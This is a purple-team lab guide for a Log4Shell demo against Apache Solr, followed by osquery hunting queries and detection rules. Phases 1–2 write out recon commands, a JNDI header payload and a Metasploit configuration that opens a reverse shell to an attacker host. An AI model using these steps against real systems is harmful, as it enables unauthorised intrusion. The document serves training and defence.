 Log4Shell Purple Team Demo — "Operation Bad Memories"

## Scenario Background

A mid-sized e-commerce company ("NorthBay Retail") runs Apache Solr as the search backend across its product catalog, internal knowledge base, and customer support portal. The infrastructure team deployed Solr 8.11.0 on multiple Ubuntu VMs during a rapid scaling effort in late 2021 — two weeks before the Log4Shell disclosure. Patches were applied to the public-facing catalog servers, but the internal knowledge base and support portal Solr instances were missed because they sit behind a VPN and were considered "low risk."

Six months later, an attacker compromises a VPN credential via a phishing campaign (out of scope for this demo — we start from network access). The attacker is now on the internal subnet and begins hunting for exploitable services.

This demo walks through the attacker's workflow (Phases 1–2) and the defender's response (Phase 3).

---

## Environment Requirements

### Network Layout

```
┌─────────────────────────────────────────────────────────┐
│  Internal Subnet: 10.20.30.0/24                         │
│                                                         │
│  10.20.30.10  ── attacker (Kali Linux)                  │
│  10.20.30.50  ── solr-kb (Knowledge Base Solr 8.11.0)   │
│  10.20.30.51  ── solr-support (Support Portal Solr 8.11.0) │
│  10.20.30.52  ── solr-catalog (Product Catalog Solr 8.11.1 — PATCHED) │
│  10.20.30.100 ── fleet-mgr (osquery fleet manager)      │
└─────────────────────────────────────────────────────────┘
```

### VM Specifications

- **attacker (10.20.30.10):** Kali Linux with Metasploit, nmap, and nuclei installed
- **solr-kb (10.20.30.50):** Ubuntu 20.04, Apache Solr 8.11.0, OpenJDK 8u181 (intentionally old — pre-`trustURLCodebase` restriction)
- **solr-support (10.20.30.51):** Ubuntu 20.04, Apache Solr 8.11.0, OpenJDK 8u181
- **solr-catalog (10.20.30.52):** Ubuntu 20.04, Apache Solr 8.11.1 (patched, Log4j 2.17.1) — exists to show that scanning correctly skips patched hosts
- **fleet-mgr (10.20.30.100):** Ubuntu 22.04, osquery 5.x, acts as the fleet management node

### Setup Notes

All Solr instances should be running with the default admin UI exposed on port 8983. The two vulnerable VMs (`solr-kb`, `solr-support`) must use a JDK older than 8u191 for the JNDI class-loading exploit to work. The patched instance (`solr-catalog`) is there specifically so the demo shows correct triage — it must NOT be flagged during exploitation.

---

## Phase 1 — Recon: Network Discovery and Vulnerability Confirmation

The attacker has VPN access to the 10.20.30.0/24 subnet. They don't know what's running on it. Goal: find exploitable services.

### Step 1 — Service Discovery with nmap

Scan the subnet for common web application ports.

```bash
nmap -sV -p 8983,8080,8443,443,80,9200 --open 10.20.30.0/24 -oG solr-scan.txt
```

Expected output should reveal three hosts with port 8983 open running Solr (Jetty 9.4.x). The attacker now knows there are Solr instances on .50, .51, and .52.

### Step 2 — Fingerprint Solr Versions

Hit the Solr admin API to pull version info from each discovered host.

```bash
for host in 10.20.30.50 10.20.30.51 10.20.30.52; do
  echo "=== $host ==="
  curl -s "http://$host:8983/solr/admin/info/system" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(f\"Solr: {d['lucene']['solr-spec-version']}, Java: {d['jvm']['version']}\")"
done
```

Expected output:

```
=== 10.20.30.50 ===
Solr: 8.11.0, Java: 1.8.0_181
=== 10.20.30.51 ===
Solr: 8.11.0, Java: 1.8.0_181
=== 10.20.30.52 ===
Solr: 8.11.1, Java: 1.8.0_352
```

The attacker notes: .50 and .51 are running 8.11.0 on an old JDK — prime Log4Shell targets. The .52 instance is patched (8.11.1) and on a newer JDK.

### Step 3 — Confirm Exploitability with nuclei

Use nuclei's Log4Shell template to inject JNDI payloads into Solr's HTTP headers and confirm out-of-band callbacks.

```bash
# Create a target list from the nmap results
echo "http://10.20.30.50:8983" > solr-targets.txt
echo "http://10.20.30.51:8983" >> solr-targets.txt
echo "http://10.20.30.52:8983" >> solr-targets.txt

# Run the Log4Shell scan — nuclei injects ${jndi:ldap://...} into
# multiple headers (User-Agent, X-Forwarded-For, Referer, etc.)
# and listens for DNS/HTTP callbacks via interactsh
nuclei -l solr-targets.txt -t cves/2021/CVE-2021-44228.yaml -oob -o confirmed-vulnerable.txt
```

Expected output in `confirmed-vulnerable.txt`:

```
[CVE-2021-44228] http://10.20.30.50:8983
[CVE-2021-44228] http://10.20.30.51:8983
```

The .52 host does NOT appear — its patched Log4j does not resolve the JNDI lookup. The attacker now has two confirmed exploitable targets.

### Phase 1 Summary

The attacker went from "I'm on a subnet" to "I have two confirmed Log4Shell-vulnerable Solr instances" in three commands. This is realistic for an internal penetration test where the attacker already has network access.

---

## Phase 2 — Exploit: Log4Shell RCE via Metasploit

The attacker picks `solr-kb` (10.20.30.50) as the initial target — a knowledge base server is likely to contain internal documentation, credentials, and architecture diagrams.

### Step 1 — Launch Metasploit

```bash
msfconsole
```

### Step 2 — Configure the Log4Shell Module

```
use exploit/multi/http/log4shell_header_injection

set RHOSTS 10.20.30.50
set RPORT 8983
set SRVHOST 10.20.30.10
set TARGETURI /solr/admin/info/system
set HTTP_HEADER User-Agent
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 10.20.30.10
set LPORT 4444
```

Configuration notes:
- `TARGETURI` is set to `/solr/admin/info/system` — a Solr endpoint that logs the requesting User-Agent via Log4j. Any Solr endpoint that triggers logging will work.
- `SRVHOST` is the attacker's IP. Metasploit starts a rogue LDAP server (default port 1389) and an HTTP server (default port 8888) on this address. The victim's Log4j will call back to these.
- `HTTP_HEADER` is set to `User-Agent` because Solr logs this header through Log4j by default.

### Step 3 — Execute

```
exploit
```

What happens under the hood:

1. Metasploit starts a rogue LDAP server on `10.20.30.10:1389`
2. Metasploit starts an HTTP server on `10.20.30.10:8888` hosting a malicious Java class
3. Metasploit sends a request to `http://10.20.30.50:8983/solr/admin/info/system` with `User-Agent: ${jndi:ldap://10.20.30.10:1389/...}`
4. Solr's Log4j processes the header, resolves the JNDI lookup, contacts the attacker's LDAP server
5. The LDAP server redirects the victim to the HTTP server to fetch the malicious `.class` file
6. Because the victim runs JDK 8u181 (< 8u191), it loads and executes the remote class without restriction
7. The class opens a reverse TCP shell back to `10.20.30.10:4444`

### Step 4 — Confirm Access

```
whoami
# Expected: solr (the service account running Solr)

hostname
# Expected: solr-kb

cat /etc/default/solr.in.sh
# Look for SOLR_JAVA_HOME, ZK_HOST, or other config that reveals architecture
```

### Step 5 — (Optional) Pivot Confirmation

Background the session and repeat against `solr-support` (10.20.30.51) to demonstrate that multiple hosts are exploitable:

```
background
set RHOSTS 10.20.30.51
exploit
```

### Troubleshooting

- **No callback:** Verify no iptables rules on the attacker are blocking inbound connections on ports 1389 and 8888. Run `iptables -L -n` to check.
- **LDAP callback received but no shell:** The victim's JDK is too new. Confirm with the version fingerprint from Phase 1. Must be < 8u191.
- **Solr returns 404:** Try alternate URIs: `/solr/admin/cores`, `/solr/select?q=test`, or just `/solr/`.

---

## Phase 3 — Hunt: Blue Team Response with Osquery

The security team has been alerted (maybe the SIEM caught the outbound LDAP connection, maybe the attacker was noisy). Now they need to answer: **how many other hosts in the environment are vulnerable to the same exploit?**

This phase uses osquery to sweep the fleet, and includes a local filesystem check for hosts where osquery isn't yet deployed.

### Query 1: Find Vulnerable Log4j JARs on Disk

Deploy this across the fleet via osquery. It scans for `log4j-core-*.jar` files and flags any with versions in the vulnerable range.

```sql
-- log4shell_vulnerable_jars
-- Scans common application directories for log4j-core JARs
-- and flags versions >= 2.0 and < 2.17.0 as vulnerable to CVE-2021-44228.

SELECT
  f.path,
  f.filename,
  f.size,
  f.mtime,
  REGEX_MATCH(f.filename, 'log4j-core-(\d+\.\d+\.?\d*)', 1) AS log4j_version,
  h.md5
FROM
  file f
JOIN
  hash h ON f.path = h.path
WHERE
  (
    f.path LIKE '/opt/%/log4j-core-%.jar'
    OR f.path LIKE '/usr/%/log4j-core-%.jar'
    OR f.path LIKE '/var/%/log4j-core-%.jar'
    OR f.path LIKE '/home/%/log4j-core-%.jar'
    OR f.path LIKE '/srv/%/log4j-core-%.jar'
    OR f.path LIKE '/tmp/%/log4j-core-%.jar'
  )
  AND REGEX_MATCH(f.filename, 'log4j-core-(\d+\.\d+\.?\d*)', 1) >= '2.0'
  AND REGEX_MATCH(f.filename, 'log4j-core-(\d+\.\d+\.?\d*)', 1) < '2.17.0';
```

### Query 2: Detect Active JNDI Exploitation (Runtime)

Catches Java processes making outbound connections to suspicious LDAP/RMI ports — an indicator that exploitation is happening right now.

```sql
-- log4shell_runtime_indicator
-- Detects Java processes with outbound connections to LDAP/RMI ports,
-- which may indicate active Log4Shell exploitation.

SELECT
  p.pid,
  p.name,
  p.cmdline,
  po.remote_address,
  po.remote_port,
  po.local_port
FROM
  process_open_sockets po
JOIN
  processes p ON po.pid = p.pid
WHERE
  po.remote_port IN (1389, 1099, 389)
  AND po.remote_address NOT IN ('127.0.0.1', '::1', '0.0.0.0')
  AND p.name LIKE '%java%';
```

### Query 3: Fallback Filesystem Scan (for hosts without osquery)

For any host where osquery isn't installed, SSH in and run this — the same principle as Query 1, but as a shell one-liner:

```bash
find / -name "log4j-core-*.jar" -exec sh -c '
  unzip -l "$1" 2>/dev/null | grep -q "JndiLookup.class" && echo "VULNERABLE: $1"
' _ {} \; 2>/dev/null
```

### Osquery Pack Definition

Save as `log4shell.conf` and deploy via the fleet manager:

```json
{
  "queries": {
    "log4shell_vulnerable_jars": {
      "query": "SELECT f.path, f.filename, REGEX_MATCH(f.filename, 'log4j-core-(\\d+\\.\\d+\\.?\\d*)', 1) AS log4j_version, h.md5 FROM file f JOIN hash h ON f.path = h.path WHERE (f.path LIKE '/opt/%/log4j-core-%.jar' OR f.path LIKE '/usr/%/log4j-core-%.jar' OR f.path LIKE '/var/%/log4j-core-%.jar' OR f.path LIKE '/home/%/log4j-core-%.jar') AND REGEX_MATCH(f.filename, 'log4j-core-(\\d+\\.\\d+\\.?\\d*)', 1) >= '2.0' AND REGEX_MATCH(f.filename, 'log4j-core-(\\d+\\.\\d+\\.?\\d*)', 1) < '2.17.0';",
      "interval": 3600,
      "description": "Finds log4j-core JARs with versions vulnerable to CVE-2021-44228",
      "value": "Identify hosts with unpatched Log4j installations"
    },
    "log4shell_runtime_indicator": {
      "query": "SELECT p.pid, p.name, p.cmdline, po.remote_address, po.remote_port FROM process_open_sockets po JOIN processes p ON po.pid = p.pid WHERE po.remote_port IN (1389, 1099, 389) AND po.remote_address NOT IN ('127.0.0.1', '::1') AND p.name LIKE '%java%';",
      "interval": 60,
      "description": "Detects Java processes making outbound LDAP/RMI connections (possible active exploitation)",
      "value": "Detect active Log4Shell exploitation attempts"
    }
  }
}
```

### Expected Results

- `solr-kb` (10.20.30.50): returns `log4j-core-2.14.1.jar` — VULNERABLE
- `solr-support` (10.20.30.51): returns `log4j-core-2.14.1.jar` — VULNERABLE
- `solr-catalog` (10.20.30.52): returns `log4j-core-2.17.1.jar` — NOT flagged (patched)
- If the attacker's exploit is still active, the runtime query fires on .50 showing an outbound connection to 10.20.30.10:1389

---

## Demo Flow Summary

| Phase | Role | Tools | Goal |
|-------|------|-------|------|
| 1 — Recon | Red Team | nmap, curl, nuclei | Discover Solr instances, fingerprint versions, confirm Log4Shell exploitability via OOB callback |
| 2 — Exploit | Red Team | Metasploit | Achieve RCE on vulnerable Solr host, obtain reverse shell |
| 3 — Hunt | Blue Team | osquery, find/unzip | Sweep the fleet for other vulnerable Log4j installations and detect active exploitation |

---

## Elastic Security Integration (Optional)

For a full-circle demo tying this back to Elastic:

1. **Ingest osquery results** via the Elastic Agent's osquery manager integration. The vulnerable JAR and runtime indicator queries become scheduled osquery packs managed from Kibana.
2. **Create detection rules** in Elastic Security:
   - Rule 1: Alert when `log4shell_vulnerable_jars` returns any results (threshold: >= 1 row)
   - Rule 2: Alert when `log4shell_runtime_indicator` detects outbound LDAP from a Java process
3. **Timeline investigation:** Use the alerts to pivot into the Elastic Security timeline, correlating the osquery findings with network logs (Zeek/Suricata) showing the JNDI callback traffic from Phase 2.

---

## Safety Notes

- This is a controlled lab exercise. All VMs must be isolated and owned by the tester.
- Never expose vulnerable Solr instances to any network beyond the lab subnet.
- The JDK version on the vulnerable VMs is intentionally outdated — this is required for the exploit to work and must not be used in production.
- Metasploit exploitation of systems without written authorization is illegal.